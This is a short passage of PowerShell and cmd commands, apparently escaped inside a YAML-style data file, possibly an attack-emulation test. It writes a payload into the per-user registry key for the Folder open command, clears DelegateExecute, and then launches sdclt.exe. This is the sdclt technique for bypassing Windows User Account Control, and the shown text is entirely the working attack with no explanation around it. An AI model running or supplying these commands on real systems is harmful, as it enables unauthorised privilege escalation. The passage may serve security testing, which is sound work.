    command\" -Name \"(Default)\" -Value $payload -Force;\nSet-ItemProperty -Path\
    \ \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"\
    \ -Value \"\" -Force;\n\ncmd.exe /c sdclt.exe;\ncmd.exe /c powershell.exe;"
